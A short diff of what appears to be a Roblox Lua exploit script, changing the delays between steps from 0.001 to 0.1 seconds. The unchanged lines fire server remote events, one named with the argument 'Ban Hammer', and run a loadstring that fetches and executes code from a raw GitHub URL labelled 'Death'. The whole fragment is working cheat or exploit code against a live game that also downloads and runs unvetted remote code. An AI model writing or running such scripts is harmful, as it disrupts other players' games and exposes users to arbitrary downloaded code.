@@ -33,13 +33,13 @@ task.wait(0.001)
 ReplicatedStorage.GeneralAbility:FireServer("0")
 
 -- Wait another 1 millisecond
-task.wait(0.001)
+task.wait(0.1)
 
 -- Execute the second loadstring
 executeLoadstring('https://raw.githubusercontent.com/LoserGrape/Pooshiesty/main/Death')
 
 -- Wait another 1 millisecond
-task.wait(0.001)
+task.wait(0.1)
 
 -- Execute the second remote event
 ReplicatedStorage.RetroAbility:FireServer("Ban Hammer")
